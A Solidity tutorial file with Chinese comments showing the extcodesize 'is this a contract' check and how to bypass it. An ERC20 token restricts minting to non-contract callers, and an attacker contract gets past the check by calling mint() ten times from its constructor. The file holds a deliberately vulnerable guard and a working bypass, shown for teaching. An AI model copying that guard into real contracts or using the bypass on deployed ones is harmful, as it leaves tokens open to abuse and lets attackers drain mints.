// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// 用extcodesize检查是否为合约地址
contract ContractCheck is ERC20 {
    // 构造函数：初始化代币名称和代号
    constructor() ERC20("", "") {}
    
    // 利用 extcodesize 检查是否为合约
    function isContract(address account) public view returns (bool) {
        // extcodesize > 0 的地址一定是合约地址
        // 但是合约在构造函数时候 extcodesize 为0
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // mint函数，只有非合约地址能调用（有漏洞）
    function mint() public {
        require(!isContract(msg.sender), "Contract not allowed!");
        _mint(msg.sender, 100);
    }
}

// 利用构造函数的特点攻击
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // This will work
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // 合约创建好以后，extcodesize > 0，isContract() 可以检测
    function mint() external {
        ContractCheck(contractCheck).mint();
    }
}
